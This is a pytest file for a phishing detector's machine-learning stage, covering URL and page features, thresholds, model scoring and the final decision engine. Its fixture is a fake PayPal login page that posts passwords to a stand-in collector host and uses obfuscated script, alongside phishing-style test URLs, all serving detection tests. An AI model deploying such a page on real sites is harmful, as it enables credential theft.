"""Tests for the ML stage: features, thresholds, runtime scoring and decision-engine integration."""
import math
import os
import random

import numpy as np
import pytest

from core_engine.final_decision_engine import FinalDecisionEngine
from ml import trainlib
from ml.features import (LEXICAL_FEATURES, LEXICAL_HOST_FEATURES, PAGE_FEATURES, empty_page_features, group_key,
                         lexical_features, page_features)
from ml.model_runtime import ModelRuntime, band_of, ml_to_score

PHISH_HTML = """<html><head><title>PayPal - Log in</title></head><body>
<form action="https://collector.example-evil.top/post.php" method="post">
<input type="text" name="email"><input type="password" name="pw"></form>
<script>eval(atob('YWxlcnQoMSk='));document.addEventListener('contextmenu', e => e.preventDefault());</script>
</body></html>"""


def test_feature_names_are_complete_and_numeric():
    f = lexical_features("https://secure-paypal.verify-account.xyz/login.php?id=1")
    assert set(f) == set(LEXICAL_FEATURES)
    assert all(isinstance(v, float) and not math.isnan(v) for v in f.values())
    assert f["brand_mismatch"] == 1 and f["tld_abused"] == 1 and f["file_ext_php"] == 1


def test_official_brand_domain_is_not_a_brand_mismatch():
    assert lexical_features("https://www.paypal.com/signin")["brand_mismatch"] == 0
    assert lexical_features("https://paypal.com.evil-login.top/")["brand_mismatch"] == 1


def test_free_hosting_and_ip_hosts_detected():
    assert lexical_features("https://abc123.vercel.app/")["free_hosting"] == 1
    assert lexical_features("http://192.0.2.10:8080/x")["is_ip_host"] == 1


def test_page_features_see_login_form_posting_elsewhere():
    pf = page_features(PHISH_HTML, "https://paypa1-secure.example/", "https://paypa1-secure.example/", {})
    assert set(pf) == set(PAGE_FEATURES)
    assert pf["n_password"] == 1 and pf["form_action_external"] == 1
    assert pf["title_brand"] == 1 and pf["title_brand_mismatch"] == 1
    assert pf["obfuscation_calls"] >= 1 and pf["right_click_blocked"] == 1


def test_unreachable_page_gives_unknown_not_zero():
    pf = page_features("", "https://x.example/", "https://x.example/", {"domain_age_days": 12})
    assert pf["page_reachable"] == 0.0
    assert math.isnan(pf["n_forms"])
    assert pf["domain_age_days"] == 12.0
    assert set(empty_page_features()) == set(PAGE_FEATURES)


def test_split_is_stable_and_by_site():
    assert trainlib.split_of("example.com") == trainlib.split_of("example.com")
    assert group_key("https://a.example.com/x") == group_key("https://b.example.com/y")
    assert group_key("https://one.vercel.app/") != group_key("https://two.vercel.app/")


def test_score_mapping_matches_band_cutoffs():
    t_low, t_high = 0.2, 0.9
    last = -1.0
    for p in np.linspace(0, 1, 201):
        score = ml_to_score(p, t_low, t_high)
        assert score >= last - 1e-9
        last = score
        band = band_of(p, t_low, t_high)
        if band == "SAFE":
            assert score < 50
        elif band == "SUSPICIOUS":
            assert 50 <= score < 80
        else:
            assert score >= 80


def test_thresholds_respect_precision_and_miss_rate():
    rng = np.random.default_rng(1)
    y = np.array([1] * 500 + [0] * 500)
    p = np.concatenate([rng.beta(6, 2, 500), rng.beta(2, 6, 500)])
    thr = trainlib.choose_thresholds(y, p, assumed_prevalence=0.05, target_precision=0.99, max_miss_rate=0.02)
    assert 0 <= thr["t_low"] < thr["t_high"] <= 1
    assert (p[y == 1] < thr["t_low"]).mean() <= 0.03


def _train_tiny_artifacts(directory):
    """Real LightGBM models on a toy rule, saved with the production artifact layout."""
    from ml.features import FEATURE_VERSION
    rng = random.Random(3)
    bad = ["https://secure-login-{}.xyz/verify.php?id={}", "http://paypal-update{}.top/login?x={}",
           "https://account-confirm{}.icu/signin.php?s={}"]
    good = ["https://www.example{}.com/about?p={}", "https://docs{}.python.org/3/library/{}.html",
            "https://news{}.bbc.co.uk/world/{}"]
    urls, y = [], []
    for i in range(300):
        urls.append(rng.choice(bad).format(rng.randint(1, 999), rng.randint(1, 99999))); y.append(1)
        urls.append(rng.choice(good).format(rng.randint(1, 999), rng.randint(1, 99999))); y.append(0)
    X = np.array([[lexical_features(u)[n] for n in LEXICAL_HOST_FEATURES] for u in urls], dtype=np.float32)
    y = np.array(y)
    clf = trainlib.fit_lgbm(X, y, X, y)
    raw = clf.predict_proba(X)[:, 1]
    cal = trainlib.fit_calibrator(raw, y)
    thr = trainlib.choose_thresholds(y, cal.predict(raw))
    import joblib
    os.makedirs(directory, exist_ok=True)
    joblib.dump({"model": clf, "calibrator": cal, "features": LEXICAL_HOST_FEATURES, "feature_version": FEATURE_VERSION,
                 "thresholds": thr, "version": "test"}, os.path.join(directory, "lexical_model.joblib"))


def test_runtime_scores_with_a_real_model(tmp_path, monkeypatch):
    monkeypatch.setenv("ENABLE_ML", "true")
    _train_tiny_artifacts(str(tmp_path))
    rt = ModelRuntime(str(tmp_path))
    bad = rt.score("https://secure-login-123.xyz/verify.php?id=777")
    good = rt.score("https://www.example42.com/about?p=9")
    assert bad["model"] == good["model"] == "lexical"
    assert bad["probability"] > good["probability"]
    assert bad["band"] in ("SUSPICIOUS", "DANGEROUS") and good["band"] == "SAFE"
    assert 0 <= bad["score"] <= 100


def test_runtime_returns_none_without_models(tmp_path):
    rt = ModelRuntime(str(tmp_path / "missing"))
    assert rt.available() is False
    assert rt.score("https://example.com/") is None


def test_runtime_can_be_disabled(tmp_path, monkeypatch):
    _train_tiny_artifacts(str(tmp_path))
    monkeypatch.setenv("ENABLE_ML", "false")
    assert ModelRuntime(str(tmp_path)).score("https://example.com/") is None


def test_decision_engine_uses_ml_score_without_hard_override():
    ml = {"score": 91.0, "probability": 0.97, "band": "DANGEROUS", "model": "page", "model_version": "t",
          "signals": ["login form with password field"]}
    out = FinalDecisionEngine().evaluate(url="https://new-site.example/", ml=ml)
    assert out["verdict"].startswith("CRITICAL") and out["threat_score"] == 91.0
    assert out["telemetry"]["ml_used"] is True
    assert "ML classifier" in out["summary"]

    safe = FinalDecisionEngine().evaluate(url="https://new-site.example/", ml={**ml, "score": 12.0, "band": "SAFE", "probability": 0.02})
    assert safe["verdict"].startswith("LEGITIMATE")


def test_hard_rules_still_override_a_safe_ml_verdict():
    ml = {"score": 5.0, "probability": 0.01, "band": "SAFE", "model": "lexical", "signals": []}
    out = FinalDecisionEngine().evaluate(url="https://x.example/", known_db_match=1, ml=ml)
    assert out["threat_score"] == 100.0


def test_engine_without_ml_is_unchanged():
    out = FinalDecisionEngine().evaluate(url="https://x.example/")
    assert out["telemetry"]["ml_used"] is False


def test_evidence_features_from_sandbox_v2():
    from ml.features import EVIDENCE_FEATURES, evidence_features
    empty = evidence_features(None)
    assert set(empty) == set(EVIDENCE_FEATURES) and all(math.isnan(v) for v in empty.values())
    ev = {"credential_surface_found": True, "sensitive_field_types": ["password", "otp"], "probe_credentials_sent": True,
          "submit_cross_domain": True, "wording": {"urgency": 2, "threat": 1}, "brand_owns_domain": False,
          "tls_issuer": "Let's Encrypt", "domain_age_days": 4, "claimed_brand": "hdfc"}
    f = evidence_features(ev)
    assert f["ev_cred_found"] == 1 and f["ev_has_password"] == 1 and f["ev_has_otp"] == 1 and f["ev_submit_cross_domain"] == 1
    assert f["ev_brand_owns_domain"] == 0.0 and f["ev_tls_free_ca"] == 1 and f["ev_domain_age_days"] == 4
    assert math.isnan(evidence_features({**ev, "brand_owns_domain": None})["ev_brand_owns_domain"])      # unknown stays unknown


# ---- shared-hosting bias fix --------------------------------------------------------------------------------------------

def test_is_hosted_recognises_shared_hosting_platforms():
    from ml.features import is_hosted
    assert is_hosted("https://my-app.vercel.app/") and is_hosted("https://someone.github.io/blog") and is_hosted("https://x.netlify.app")
    assert not is_hosted("https://www.google.com/") and not is_hosted("https://example.co.uk/")


def test_hosted_balance_weights_stop_phishing_from_drowning_the_few_benign_hosted_sites():
    import numpy as np
    from ml import trainlib
    urls = ["https://a%d.vercel.app/" % i for i in range(40)] + ["https://good1.vercel.app/", "https://good2.netlify.app/",
                                                                  "https://plain.example.com/", "https://other.example.org/"]
    labels = np.array([1] * 40 + [0, 0, 0, 0])
    weights, stat = trainlib.hosted_balance_weights(urls, labels)
    assert stat["hosted_malicious"] == 40 and stat["hosted_benign"] == 2
    assert weights[40] == weights[41] == 8.0                     # capped: 40/2 = 20 would be too aggressive
    assert weights[42] == weights[43] == 1.0 and (weights[:40] == 1.0).all()       # nothing else is touched


def test_hosted_benign_loader_collects_real_projects_and_ignores_the_rest(monkeypatch, tmp_path):
    from ml import datasets
    monkeypatch.setattr(datasets, "RAW_DIR", str(tmp_path))
    monkeypatch.setattr(datasets.time, "sleep", lambda s: None)
    monkeypatch.setattr(datasets, "HOSTED_TOPICS", ["vercel"])
    monkeypatch.setattr(datasets, "HOSTED_STAR_BANDS", [(15, 40)])
    calls = []

    class Resp:
        status_code = 200

        def json(self):
            return {"items": [{"homepage": "https://cool-app.vercel.app/"}, {"homepage": "https://cool-app.vercel.app/about"},
                              {"homepage": "http://insecure.vercel.app/"}, {"homepage": "https://example.com/"},
                              {"homepage": ""}, {"homepage": "https://my.github.io/site"}]}

    monkeypatch.setattr(datasets.requests, "get", lambda *a, **k: calls.append(k.get("params")) or Resp())
    urls = datasets.load_hosted_benign(refresh=True, target=100)
    assert urls == ["https://cool-app.vercel.app/", "https://my.github.io/"]      # https only, hosted only, one per host
    assert calls and "topic:vercel" in calls[0]["q"]
    # the second call uses the cached file instead of asking GitHub again
    monkeypatch.setattr(datasets.requests, "get", lambda *a, **k: (_ for _ in ()).throw(AssertionError("must use the cache")))
    assert datasets.load_hosted_benign(refresh=False, target=2) == urls


def test_hosted_benign_loader_survives_a_rate_limit(monkeypatch, tmp_path):
    from ml import datasets
    monkeypatch.setattr(datasets, "RAW_DIR", str(tmp_path))
    monkeypatch.setattr(datasets.time, "sleep", lambda s: None)

    class Limited:
        status_code = 403

    monkeypatch.setattr(datasets.requests, "get", lambda *a, **k: Limited())
    assert datasets.load_hosted_benign(refresh=True, target=10) == []


def test_probabilities_are_rounded_like_the_thresholds_chosen_in_training():
    import numpy as np
    from ml.model_runtime import ModelRuntime, band_of

    class Calibrator:
        def predict(self, raw):
            return np.array([13 / 14])               # a calibration step: 0.928571...

    class Model:
        def predict_proba(self, row):
            return np.array([[0.1, 0.9]])

    p = ModelRuntime._probability({"model": Model(), "calibrator": Calibrator()}, np.zeros((1, 3)))
    assert p == 0.9286 and band_of(p, 0.0789, 0.9286) == "DANGEROUS"       # was 0.928571 < 0.9286: stuck at "suspicious"
